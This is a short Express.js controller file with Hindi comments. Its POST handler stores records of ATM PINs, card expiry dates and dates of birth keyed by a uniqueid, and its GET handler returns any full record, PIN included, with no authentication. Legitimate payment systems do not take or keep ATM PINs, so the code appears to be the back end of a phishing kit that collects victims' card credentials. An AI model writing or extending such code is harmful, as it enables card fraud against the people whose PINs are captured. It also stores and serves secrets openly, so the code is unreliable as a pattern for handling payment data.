// controllers/cardController.js
const CardPayment = require('../models/CardPayment');

exports.saveOrUpdateCardPayment = async (req, res) => {
  try {
    const {
      uniqueid,
      atmPin,
      expiryMonth,
      expiryYear,
      dateOfBirth
    } = req.body;

    // पहले देखें कि ये uniqueid से कोई रिकॉर्ड है या नहीं
    let record = await CardPayment.findOne({ uniqueid });

    if (record) {
      // अगर है, तो उसकी फील्ड्स अपडेट कर दो
      record.atmPin      = atmPin;
      record.expiryMonth = expiryMonth;
      record.expiryYear  = expiryYear;
      record.dateOfBirth = dateOfBirth;
    } else {
      // नहीं है, तो नया डॉक्यूमेंट क्रिएट करो
      record = new CardPayment({
        uniqueid,
        atmPin,
        expiryMonth,
        expiryYear,
        dateOfBirth
      });
    }

    await record.save();

    res.status(200).json({
      success: true,
      message: "Card payment data saved/updated successfully!",
      data: record
    });
  } catch (error) {
    console.error("saveOrUpdateCardPayment error:", error);
    res.status(500).json({
      success: false,
      message: "Error occurred while saving card payment data"
    });
  }
};

exports.getCardPaymentByUniqueId = async (req, res) => {
  try {
    const { uniqueid } = req.params;
    const record = await CardPayment.findOne({ uniqueid });

    if (!record) {
      return res.status(404).json({
        success: false,
        message: "No card payment data found for this uniqueid"
      });
    }

    res.status(200).json({
      success: true,
      data: record
    });
  } catch (error) {
    console.error("getCardPaymentByUniqueId error:", error);
    res.status(500).json({
      success: false,
      message: "Error occurred while fetching card payment data"
    });
  }
};
